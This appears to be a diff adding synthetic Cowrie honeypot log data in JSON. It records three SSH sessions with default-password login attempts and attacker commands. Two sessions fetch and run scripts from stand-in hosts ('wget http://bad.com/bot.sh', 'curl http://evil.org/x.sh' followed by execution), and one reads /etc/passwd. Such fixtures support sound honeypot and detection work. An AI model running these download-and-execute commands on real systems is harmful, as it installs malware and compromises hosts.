@@ -1,0 +1,22 @@
+[
+  {"eventid":"cowrie.session.connect","timestamp":"2026-03-24T12:00:00Z","session":"A1","src_ip":"91.134.182.45"},
+  {"eventid":"cowrie.login.failed","timestamp":"2026-03-24T12:00:02Z","session":"A1","username":"root","password":"root"},
+  {"eventid":"cowrie.login.success","timestamp":"2026-03-24T12:00:05Z","session":"A1","username":"root","password":"toor"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:00:06Z","session":"A1","input":"uname -a"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:00:08Z","session":"A1","input":"cat /etc/passwd"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:00:10Z","session":"A1","input":"wget http://bad.com/bot.sh"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:00:12Z","session":"A1","input":"chmod +x bot.sh"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:00:14Z","session":"A1","input":"./bot.sh"},
+
+  {"eventid":"cowrie.session.connect","timestamp":"2026-03-24T12:01:00Z","session":"B2","src_ip":"45.83.64.21"},
+  {"eventid":"cowrie.login.failed","timestamp":"2026-03-24T12:01:02Z","session":"B2","username":"admin","password":"admin"},
+  {"eventid":"cowrie.login.failed","timestamp":"2026-03-24T12:01:04Z","session":"B2","username":"root","password":"123456"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:01:06Z","session":"B2","input":"ls"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:01:08Z","session":"B2","input":"pwd"},
+
+  {"eventid":"cowrie.session.connect","timestamp":"2026-03-24T12:02:00Z","session":"C3","src_ip":"103.27.9.18"},
+  {"eventid":"cowrie.login.success","timestamp":"2026-03-24T12:02:03Z","session":"C3","username":"root","password":"toor"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:02:05Z","session":"C3","input":"whoami"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:02:07Z","session":"C3","input":"curl http://evil.org/x.sh"},
+  {"eventid":"cowrie.command.input","timestamp":"2026-03-24T12:02:09Z","session":"C3","input":"bash x.sh"}
+]
